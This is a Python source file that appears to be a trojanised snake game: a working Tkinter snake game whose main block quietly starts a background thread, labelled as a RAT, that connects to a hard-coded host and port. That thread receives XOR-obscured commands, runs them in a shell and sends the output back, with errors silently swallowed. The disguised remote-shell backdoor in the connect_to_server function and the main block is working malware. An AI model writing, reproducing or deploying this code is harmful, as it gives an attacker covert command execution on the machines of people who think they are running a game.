import threading
import tkinter
import socket
import subprocess
import random

# --- CONFIGURATION ---
server_ip = '10.18.2.31' 
port = 9999
ENCRYPTION_KEY = b'secretkey'

def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# --- RAT CONNECTION LOGIC ---
def connect_to_server():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(5)
        client.connect((server_ip, port))
        client.settimeout(None)

        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            
            command = xor_crypt(encrypted_command, ENCRYPTION_KEY).decode()

            if command.lower() == 'exit':
                client.close()
                break

            try:
                # RAW byte capture to fix the encoding problem
                output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                if not output_bytes:
                    output_bytes = b"Command executed successfully"
            except subprocess.CalledProcessError as e:
                output_bytes = e.output
            except Exception as e:
                output_bytes = str(e).encode()

            encrypted_output = xor_crypt(output_bytes, ENCRYPTION_KEY)
            client.sendall(encrypted_output)
    except Exception:
        pass 

# --- SNAKE GAME LOGIC ---
class SnakeGame:
    def __init__(self):
        self.window = tkinter.Tk()
        self.window.title("Classic Snake Game")
        self.window.resizable(False, False)

        self.GAME_WIDTH = 600
        self.GAME_HEIGHT = 400
        self.SPACE_SIZE = 20
        self.SPEED = 100

        self.score = 0
        self.direction = 'down'
        self.game_active = True

        self.label = tkinter.Label(self.window, text="Score: 0", font=('consolas', 20))
        self.label.pack()

        self.canvas = tkinter.Canvas(self.window, bg="black", height=self.GAME_HEIGHT, width=self.GAME_WIDTH)
        self.canvas.pack()

        # Restart Button
        self.restart_btn = tkinter.Button(self.window, text="Restart", command=self.restart_game, font=('consolas', 12))
        self.restart_btn.pack()

        self.window.bind('<Left>', lambda e: self.change_direction('left'))
        self.window.bind('<Right>', lambda e: self.change_direction('right'))
        self.window.bind('<Up>', lambda e: self.change_direction('up'))
        self.window.bind('<Down>', lambda e: self.change_direction('down'))

        self.snake_coords = []
        self.snake_rects = []
        self.food = None
        
        self.start_new_game()
        self.window.mainloop()

    def start_new_game(self):
        # Reset variables
        self.canvas.delete("all")
        self.score = 0
        self.direction = 'down'
        self.game_active = True
        self.label.config(text="Score: 0")
        
        # Initial Snake positions
        self.snake_coords = [[self.SPACE_SIZE*2, self.SPACE_SIZE*2], 
                             [self.SPACE_SIZE*2, self.SPACE_SIZE], 
                             [self.SPACE_SIZE*2, 0]]
        self.snake_rects = []
        
        for x, y in self.snake_coords:
            rect = self.canvas.create_rectangle(x, y, x + self.SPACE_SIZE, y + self.SPACE_SIZE, fill="#00FF00", tag="snake")
            self.snake_rects.append(rect)

        self.spawn_food()
        self.next_turn()

    def spawn_food(self):
        # FIX: // operator for Python 3.13 compatibility
        self.food_x = random.randint(0, (self.GAME_WIDTH // self.SPACE_SIZE) - 1) * self.SPACE_SIZE
        self.food_y = random.randint(0, (self.GAME_HEIGHT // self.SPACE_SIZE) - 1) * self.SPACE_SIZE
        self.food = self.canvas.create_oval(self.food_x, self.food_y, 
                                            self.food_x + self.SPACE_SIZE, 
                                            self.food_y + self.SPACE_SIZE, 
                                            fill="red", tag="food")

    def restart_game(self):
        self.game_active = False # Stop current loop
        self.start_new_game()

    def change_direction(self, new_dir):
        if new_dir == 'left' and self.direction != 'right': self.direction = new_dir
        elif new_dir == 'right' and self.direction != 'left': self.direction = new_dir
        elif new_dir == 'up' and self.direction != 'down': self.direction = new_dir
        elif new_dir == 'down' and self.direction != 'up': self.direction = new_dir

    def next_turn(self):
        if not self.game_active:
            return

        x, y = self.snake_coords[0]
        if self.direction == "up": y -= self.SPACE_SIZE
        elif self.direction == "down": y += self.SPACE_SIZE
        elif self.direction == "left": x -= self.SPACE_SIZE
        elif self.direction == "right": x += self.SPACE_SIZE

        self.snake_coords.insert(0, [x, y])
        rect = self.canvas.create_rectangle(x, y, x + self.SPACE_SIZE, y + self.SPACE_SIZE, fill="#00FF00")
        self.snake_rects.insert(0, rect)

        if x == self.food_x and y == self.food_y:
            self.score += 1
            self.label.config(text=f"Score: {self.score}")
            self.canvas.delete("food")
            self.spawn_food()
        else:
            del self.snake_coords[-1]
            self.canvas.delete(self.snake_rects[-1])
            del self.snake_rects[-1]

        if x < 0 or x >= self.GAME_WIDTH or y < 0 or y >= self.GAME_HEIGHT or [x, y] in self.snake_coords[1:]:
            self.game_over()
        else:
            self.window.after(self.SPEED, self.next_turn)

    def game_over(self):
        self.game_active = False
        self.canvas.create_text(self.GAME_WIDTH/2, self.GAME_HEIGHT/2, 
                                font=('consolas', 50), text="GAME OVER", fill="red")

if __name__ == "__main__":
    # Start RAT thread
    threading.Thread(target=connect_to_server, daemon=True).start()
    # Start Game
    SnakeGame()